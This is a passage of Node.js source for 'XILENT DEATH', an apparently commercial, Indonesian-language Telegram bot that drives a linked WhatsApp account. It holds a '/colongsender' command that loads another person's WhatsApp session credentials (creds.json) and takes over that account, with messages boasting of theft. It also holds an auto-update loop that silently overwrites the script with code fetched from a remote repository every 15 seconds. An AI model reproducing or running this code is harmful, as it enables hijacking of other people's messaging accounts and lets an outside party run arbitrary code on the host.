  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Always Prime',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote> ⬡═―—⊱ ⎧ XILENT DEATH ⎭ ⊰―—═⬡
𖤓 Number: ${lastPairingMessage.phoneNumber}
𖤓 Pairing Code: ${lastPairingMessage.pairingCode}
𖤓 Status: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⢄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀
`));
console.log(chalk.bold.red(`
╭─❖──────────────────────────❖─╮
│ Developer : @gaponback
│ Version : 4.0.0
│ Status : Sender connected 
├───────────────────────────────
│⟢ XILENT DEATH Starting...
╰─❖──────────────────────────❖─╯
  `));
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

let adminUsers = new Set([ownerID.toString()]);
function isAdminUser(userId) {
    return adminUsers.has(userId.toString());
}

function checkAdmin(ctx, next) {
    if (!isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk admin");
    }
    next();
}

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

const checkGroup = (ctx, next) => {
  const groupList = loadGroup();
  const chatId = ctx.chat.id;

  if (!groupList.includes(String(chatId))) {
    ctx.reply("🔒 Akses terkunci\n\nKetik /group untuk mengaktifkan bot");
    return;
  }

  return next();
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /addadmin\n2. /addadmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    adminUsers.add(userId);
    
    await ctx.reply(
        `👑 <b>Admin Berhasil Ditambahkan</b>\n• User: <code>${userId}</code>`,
        { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id }
    );
    
    try {
        await ctx.telegram.sendMessage(
            userId,
            `🎖️ <b>Anda sekarang Admin XILENT DEATH!</b>\nAkses: Semua command bot kecuali manage admin`,
            { parse_mode: "HTML" }
        );
    } catch (error) {}
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /deladmin\n2. /deladmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    if (userId === ownerID.toString()) {
        return ctx.reply("❌ ☇ Tidak bisa hapus owner");
    }
    
    const wasAdmin = adminUsers.delete(userId);
    
    if (wasAdmin) {
        await ctx.reply(`🗑️ <b>Admin Berhasil Dihapus</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    } else {
        await ctx.reply(`❌ <b>User bukan admin</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    }
});

bot.command('listadmin', checkAdmin, async (ctx) => {
    let adminList = "👥 <b>Daftar Admin</b>\n\n";
    let counter = 1;
    
    adminUsers.forEach(userId => {
        adminList += `${counter}. <code>${userId}</code> ${userId === ownerID.toString() ? '👑' : '👨‍💼'}\n`;
        counter++;
    });
    
    adminList += `\nTotal: ${adminUsers.size} admin`;
    await ctx.reply(adminList, { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
});

function getPremiumUsers() {
    const premiumPath = path.join(__dirname, 'database', 'premium.json');
    
    try {
        if (fs.existsSync(premiumPath)) {
            const data = JSON.parse(fs.readFileSync(premiumPath, 'utf8'));
            
            if (typeof data === 'object' && !Array.isArray(data)) {
                return Object.entries(data).map(([userId, expiryDate]) => ({
                    userId,
                    expiryDate
                }));
            }
            
            else if (Array.isArray(data)) {
                return data;
            }
        } else {
            console.log("File premium.json tidak ditemukan di", premiumPath);
        }
    } catch (error) {
        console.error("Error membaca premium.json:", error);
    }
    return [];
}

const GROUP_PATH = "./database/group.json";

function loadGroup() {
  try {
    const data = fs.readFileSync(GROUP_PATH, "utf-8");
    const parsed = JSON.parse(data);

    // paksa jadi array biar includes ga error
    return Array.isArray(parsed) ? parsed : [];
  } catch (e) {
    return [];
  }
}

function saveGroup(data) {
  fs.writeFileSync(GROUP_PATH, JSON.stringify(data, null, 2));
}

function addGroup(id) {
  const list = loadGroup();
  if (!list.includes(String(id))) {
    list.push(String(id));
    saveGroup(list);
  }
}

function delGroup(id) {
  let list = loadGroup();
  list = list.filter(x => x !== String(id));
  saveGroup(list);
}

bot.command('listprem', checkAdmin, async (ctx) => {
    const premiumUsers = getPremiumUsers();
    
    if (!premiumUsers || premiumUsers.length === 0) {
        return ctx.reply("📭 Tidak ada user premium");
    }
    
    let premList = "🌟 <b>Daftar User Premium</b>\n\n";
    
    premiumUsers.forEach((user, index) => {
        const userId = user.userId || user.id || "N/A";
        const expiry = user.expiryDate || user.expiry || "Unknown";
        
        // Cek apakah expired
        let status = "✅ Active";
        try {
            const expiryDate = new Date(expiry);
            if (new Date() > expiryDate) {
                status = "❌ Expired";
            }
        } catch (e) {}
        
        premList += `${index + 1}. <code>${userId}</code>\n`;
        premList += `   • Berakhir: ${expiry}\n`;
        premList += `   • Status: ${status}\n\n`;
    });
    
    premList += `Total: ${premiumUsers.length} user premium`;
    
    await ctx.reply(premList, { 
        parse_mode: "HTML",
        reply_to_message_id: ctx.message.message_id 
    });
});

bot.command('addprem', checkAdmin, async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } 
    
    else if (args.length >= 2) {
        userId = args[1];
    } 

    else {
        return ctx.reply("🪧 ☇ Cara penggunaan:\n1. Reply pesan target dan ketik /addprem\n2. /addprem <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID user tidak valid");
    }
    
    const keyboard = {
        inline_keyboard: [
            [
                { text: "⌜📅⌟ 1 Bulan (30 Hari)", callback_data: `addprem_${userId}_30` }
            ],
            [
                { text: "⌜⚡⌟ Permanen (100 Hari)", callback_data: `addprem_${userId}_100` }
            ]
        ]
    };
    
    await ctx.reply(
        `👑 <b>Tambah Premium</b>\n` +
        `• User: <code>${userId}</code>\n` +
        `• Pilih durasi di bawah:`,
        {
            parse_mode: "HTML",
            reply_to_message_id: ctx.message.message_id,
            reply_markup: keyboard
        }
    );
});

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "GAPOOFFC");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><b> ⬡═―—⊱ ⎧ XILENT DEATH ⎭ ⊰―—═⬡
𖤓 Number: ${phoneNumber}
𖤓 Pairing Code: ${formattedCode}
𖤓 Status: Not Connected
</b></blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><b> ⬡═―—⊱ ⎧ XILENT DEATH ⎭ ⊰―—═⬡ 
𖤓 Number: ${lastPairingMessage.phoneNumber}
𖤓 Pairing Code: ${lastPairingMessage.pairingCode}
𖤓 Status: Connected
</b></blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

let autoUpdateEnabled = true;

const VERSION_FILE = path.join(__dirname, "version.json");
const MAIN_FILE = path.join(__dirname, "xilent.js");

const REMOTE_VERSION =
  "https://raw.githubusercontent.com/ponzs212/pullupdate/main/version.json";

const REMOTE_SCRIPT =
  "https://raw.githubusercontent.com/ponzs212/pullupdate/main/xilent.js";

function getLocalVersion() {
  return JSON.parse(
    fs.readFileSync(VERSION_FILE, "utf8")
  );
}

async function checkUpdate() {
  try {
    if (!autoUpdateEnabled) return;

    const local = getLocalVersion();

    const remote = await axios.get(REMOTE_VERSION);

    if (remote.data.version === local.version) {
      console.log("✅ version sama");
      return;
    }

    console.log(
      `🔄 update ${local.version} -> ${remote.data.version}`
    );

    const newScript = await axios.get(REMOTE_SCRIPT);

    fs.writeFileSync(MAIN_FILE, newScript.data);

    fs.writeFileSync(
      VERSION_FILE,
      JSON.stringify(
        { version: remote.data.version },
        null,
        2
      )
    );

    console.log("✅ update selesai");

    setTimeout(() => {
      process.exit(1);
    }, 1000);

  } catch (err) {
    console.error("❌", err.message);
  }
}

setInterval(checkUpdate, 15000);

bot.command("autoupdate", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  if (!args) {
    return ctx.reply(
      `⚙️ Auto Update: ${autoUpdateEnabled ? "ON" : "OFF"}`
    );
  }

  if (args === "on") {
    autoUpdateEnabled = true;
    return ctx.reply("✅ Auto Update ON");
  }

  if (args === "off") {
    autoUpdateEnabled = false;
    return ctx.reply("❌ Auto Update OFF");
  }

  ctx.reply("Format: /autoupdate on/off");
});

bot.command("group", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ Owner only");
  }

  const chatId = ctx.chat.id;

  await ctx.reply(
    `⚙️ GROUP CONTROL\n\nID: ${chatId}`,
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "➕ ADD", callback_data: "group_add" },
            { text: "➖ DEL", callback_data: "group_del" }
          ]
        ]
      }
    }
  );
});

const ONLY_GROUP_FILE = "./onlygroup.json";

function loadOnlyGroup() {
  if (!fs.existsSync(ONLY_GROUP_FILE)) {
    fs.writeFileSync(
      ONLY_GROUP_FILE,
      JSON.stringify({ enabled: false, group_id: null }, null, 2)
    );
  }
  return JSON.parse(fs.readFileSync(ONLY_GROUP_FILE));
}

function saveOnlyGroup(data) {
  fs.writeFileSync(
    ONLY_GROUP_FILE,
    JSON.stringify(data, null, 2)
  );
}

bot.command("onlygroup", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ")[1];
  const data = loadOnlyGroup();

  if (args) {
    data.group_id = args;
    saveOnlyGroup(data);

    return ctx.reply(`✅ Group ID diset manual:\n${args}`);
  }

  const chatId = ctx.chat.id;

  await ctx.reply(
    `⚙️ ONLY GROUP MODE

Status : ${data.enabled ? "ON ✅" : "OFF ❌"}
Group  : ${data.group_id || "-"}
Chat   : ${chatId}`,
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🟢 ON", callback_data: "onlygroup_on" },
            { text: "🔴 OFF", callback_data: "onlygroup_off" }
          ]
        ]
      }
    }
  );
});



bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("delsender", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('colongsender', async (ctx) => {
  const msg = ctx.message;
  const chatId = msg.chat.id;
  
  if (!isOwner(msg)) return ctx.reply('❌ Khusus owner we.');

  const doc = msg.reply_to_message?.document;
  if (!doc) return ctx.reply('❌ Balas file session atau creds.json + dengan /colongsender');

  const name = doc.file_name.toLowerCase();
  if (!['.json','.zip','.tar','.tar.gz','.tgz'].some(ext => name.endsWith(ext)))
    return ctx.reply('❌ File bukan session tolol.');

  await ctx.reply('🔄 Proses colong sender in you session…');

  const url = await bot.getFileLink(doc.file_id);
  const { data } = await axios.get(url, { responseType: 'arraybuffer' });
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));

  if (name.endsWith('.json')) {
    await fs.writeFile(path.join(tmp, 'creds.json'), data);
  } else if (name.endsWith('.zip')) {
    new AdmZip(data).extractAllTo(tmp, true);
  } else {
    const tmpTar = path.join(tmp, name);
    await fs.writeFile(tmpTar, data);
    await tar.x({ file: tmpTar, cwd: tmp });
  }

  const credsPath = await findCredsFile(tmp);
  if (!credsPath) return ctx.reply('❌ creds.json tidak ditemukan bego');

  const creds = await fs.readJson(credsPath);
  const botNumber = creds.me.id.split(':')[0];

  await fs.remove(destDir);
  await fs.copy(tmp, destDir);
  saveActiveSessions(botNumber);

  const auth = await useMultiFileAuthState(destDir);
  await connectToWhatsApp(botNumber, chatId, auth);

  return ctx.reply(`*SUCCES CONNECTING🫀*
  NUMBER : ${botNumber}
  *ANJAYYY KEMALING🗿*`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcprem -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcprem -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.on("my_chat_member", async (ctx) => {
  const update = ctx.update.my_chat_member;

  const newStatus = update.new_chat_member.status;
  const oldStatus = update.old_chat_member.status;

  const chatId = update.chat.id;
  const adder = update.from;

  const added =
    (oldStatus === "left" || oldStatus === "kicked") &&
    (newStatus === "member" || newStatus === "administrator");

  if (!added) return;

  if (adder.id !== ownerID) {

    await ctx.telegram.sendMessage(
      chatId,
      `🚫 YEE GOBLOK LU NGAPAIN AJG?! 

❌ Ditambahkan oleh:
@${adder.username || "none"}

🔒 Hanya owner yang bisa menambahkan bot.`
    );

    await ctx.telegram.sendMessage(
      ownerID,
      `🚨 BOT SEDANG DI COBA DICULIK

👤 Oleh: @${adder.username || "none"}
🆔 ID: ${adder.id}
💬 Grup: ${chatId}

🕊 System: Auto Out From Group`
    );

    await ctx.leaveChat(chatId);
  } else {
    await ctx.telegram.sendMessage(
      chatId,
      "✅ Bot berhasil ditambahkan oleh owner"
    );
  }
});

const CHANNEL_FILE = "./database/channel.json";

function loadChannel() {
  try {
    return JSON.parse(
      fs.readFileSync(CHANNEL_FILE, "utf8")
    );
  } catch {
    return {
      channels: []
    };
  }
}

function saveChannel(data) {
  fs.writeFileSync(
    CHANNEL_FILE,
    JSON.stringify(data, null, 2)
  );
}

bot.command("setch", async (ctx) => {

  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ Owner only");
  }

  const args = ctx.message.text.split(" ");

  const action = args[1];
  const username = args[2];

  if (!action) {

    const data = loadChannel();

    const list = data.channels.length
      ? data.channels.map(v => `• @${v}`).join("\n")
      : "Tidak ada";

    return ctx.reply(
`📢 CHANNEL SETTINGS

Channel:
${list}

Example:
/setch add gaponback
/setch del gaponback`
    );

  }

  const data = loadChannel();

  if (action === "add") {

    if (!username) {
      return ctx.reply(
        "❌ Example:\n/setch add gaponback"
      );
    }

    const clean = username.replace("@", "");

    if (data.channels.includes(clean)) {
      return ctx.reply("❌ Channel sudah ada");
    }

    data.channels.push(clean);

    saveChannel(data);

    return ctx.reply(
`✅ Channel berhasil ditambahkan

📢 https://t.me/${clean}`
    );

  }

  if (action === "del") {

    if (!username) {
      return ctx.reply(
        "❌ Example:\n/setch del gaponback"
      );
    }

    const clean = username.replace("@", "");

    data.channels = data.channels.filter(
      v => v !== clean
    );

    saveChannel(data);

    return ctx.reply(
`✅ Channel berhasil dihapus

📢 ${clean}`
    );

  }

  return ctx.reply(
`❌ Action tidak valid

/setch add username
/setch del username`
  );

});

function loadChannel() {
  try {
    return JSON.parse(
      fs.readFileSync("./database/channel.json", "utf-8")
    );
  } catch {
    return {
      channels: []
    };
  }
}

function createJoinButtons() {

  const data = loadChannel();

  if (!data.channels || data.channels.length === 0) {
    return [];
  }

  const buttons = data.channels.map(ch => ({
    text: `📢 ${ch}`,
    url: `https://t.me/${ch}`
  }));

  return [
    buttons,
    [
      {
        text: "✅ SUDAH JOIN",
        callback_data: "cek_join"
      }
    ]
  ];
}

async function checkJoin(ctx) {

  try {

    const data = loadChannel();

    if (!data.channels || data.channels.length === 0) {
      return true;
    }

    const userId = ctx.from.id;

    const valid = [
      "member",
      "administrator",
      "creator"
    ];

    for (const ch of data.channels) {

      const member = await ctx.telegram.getChatMember(
        `@${ch}`,
        userId
      );

      if (!valid.includes(member.status)) {
        return false;
      }

    }

    return true;

  } catch (e) {
    console.log("JOIN CHECK ERROR:", e.message);
    return false;
  }

}

bot.use((ctx, next) => {
    if (secureMode) return;

    const text = (ctx.message && ctx.message.text) ? ctx.message.text : "";
    const data = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data : "";
    const isStart = (typeof text === "string" && text.startsWith("/start")) ||
                    (typeof data === "string" && data === "/start");

    if (!tokenValidated && !isStart) {
        if (ctx.callbackQuery) {
            try { ctx.answerCbQuery("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start "); } catch (e) {}
        }
        return ctx.reply("🔒 ☇ Akses terkunci ketik /start  untuk mengaktifkan bot");
    }
    return next();
});

let globalPageCooldown = 0
const PAGE_CD = 30 * 1000

bot.start(async (ctx) => {
  if (!tokenValidated) {

    const msg = await ctx.reply("🔐 Verifikasi Token Server...\n▱▱▱▱▱▱▱▱▱▱ 0%");

    function createBar(percent) {
  const total = 10;
  const filled = Math.floor(percent / 10);
  const empty = total - filled;
  return "▰".repeat(filled) + "▱".repeat(empty);
}

const progressList = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100];

for (let p of progressList) {
  await new Promise(r => setTimeout(r, 250));

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    msg.message_id,
    null,
    `🔐 Verifikasi Token Server...\n${createBar(p)} ${p}%`
  );
}

    try {
      const res = await axios.get(databaseUrl);
      const tokens = (res.data && res.data.tokens) || [];

      
      if (!tokens.includes(tokenBot)) {
        return ctx.telegram.editMessageText(
          ctx.chat.id,
          msg.message_id,
          null,
          `
<blockquote><b><tg-emoji emoji-id="4958526153955476488">❌</tg-emoji> TOKEN INVALID</b></blockquote>
<pre>
━━━━━━━━━━━━━━━━━━
Akses Ditolak

Bot tidak terdaftar
di database server

Silakan hubungi developer

━━━━━━━━━━━━━━━━━━
@gaponback
</pre>
`,
          { parse_mode: "HTML" }
        );
      }

      // ✅ TOKEN VALID
      tokenValidated = true;

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        msg.message_id,
        null,
        "✅ Verifikasi berhasil"
      );

    
     await ctx.reply(`\`\`\`js
TOKEN VALID
━━━━━━━━━━━━━━━━━━
Assalamualaikum 
Xilent Death

• Script Berkualitas
• Sistem Powerful & Stabil
• Fitur Lengkap & Premium

• Price Script : 5.000
• Reseller : 15.000

━━━━━━━━━━━━━━━━━━
@gaponback\`\`\``,
      { parse_mode: "Markdown" });

    } catch (e) {
      return ctx.telegram.editMessageText(
        ctx.chat.id,
        msg.message_id,
        null,
        "❌ ☇ Gagal memverifikasi ke database"
      );
    }
 }

const BC_URL = "https://raw.githubusercontent.com/ponzs212/gaponcuy/main/bc.json"

let lastBcId = fs.existsSync("./last_bc.json")
  ? JSON.parse(fs.readFileSync("./last_bc.json")).id
  : 0

async function checkBroadcastRestart() {
  try {
    const { data } = await axios.get(BC_URL, {
      timeout: 5000
    })

    if (!data?.id) return

    if (data.id !== lastBcId) {
      console.log("🔥 Broadcast baru terdeteksi, restarting...")

      fs.writeFileSync(
        "./last_bc.json",
        JSON.stringify({ id: data.id }, null, 2)
      )

      setTimeout(() => {
        process.exit(1)
      }, 1000)
    }

  } catch (e) {
    console.log("BC check error:", e.message)
  }
}

try {
  const { data } = await axios.get(
    "https://raw.githubusercontent.com/ponzs212/gaponcuy/main/bc.json",
    { timeout: 5000 }
  )

  const fs = require("fs")

  let lastBcId = fs.existsSync("./last_bc.json")
    ? JSON.parse(fs.readFileSync("./last_bc.json")).id
    : 0

  if (data?.id && data.id !== lastBcId) {
    fs.writeFileSync(
      "./last_bc.json",
      JSON.stringify({ id: data.id }, null, 2)
    )

    if (data.type === "text") {
      await ctx.reply(data.content)
    }

    if (data.type === "photo") {
      await ctx.replyWithPhoto(data.content, {
        caption: data.caption || ""
      })
    }

    if (data.type === "video") {
      await ctx.replyWithVideo(data.content, {
        caption: data.caption || ""
      })
    }

    if (data.type === "audio") {
      await ctx.replyWithAudio(data.content, {
        caption: data.caption || ""
      })
    }
  }

} catch (e) {
  console.log("BC error:", e.message)
}

  try {
    await ctx.telegram.setMessageReaction(
      ctx.chat.id,
      ctx.message.message_id,
      [
        {
          type: "emoji",
          emoji: "🆒"
        }
      ],
      true
    );

    console.log("Bot Jalan");
  } catch (error) {
    console.error("Gagal react:", error);
  }

  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Terisi Penuh" : "Kosong";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();
  const username = ctx.from?.username ? `@${ctx.from.username}` : "Tidak ada username";
  const groupConfig = loadOnlyGroup();
  const chatId = ctx.chat.id;
  const idLu = ctx.from.id;

const joined = await checkJoin(ctx);

if (!joined) {

  const buttons = createJoinButtons();

  return ctx.reply(
    "⚠️ Wajib join channel terlebih dahulu",
    {
      reply_markup: {
        inline_keyboard: buttons
      }
    }
  );

}
  const isGroup = ["group", "supergroup"].includes(ctx.chat.type);

if (!isGroup) {
  return ctx.reply("❌ Lau Sape Mpruy?!");
}

const groupList = loadGroup();

if (!groupList.includes(String(chatId))) {
  return ctx.reply(
    "🔒 Akses terkunci\n\nSilakan aktifkan dengan /group"
  );
}

  if (
    groupConfig.enabled &&
    String(chatId) !== String(groupConfig.group_id)
  ) {
    await ctx.reply(
      "⚠️ Fitur ini hanya untuk di group."
    );

    await bot.telegram.sendMessage(
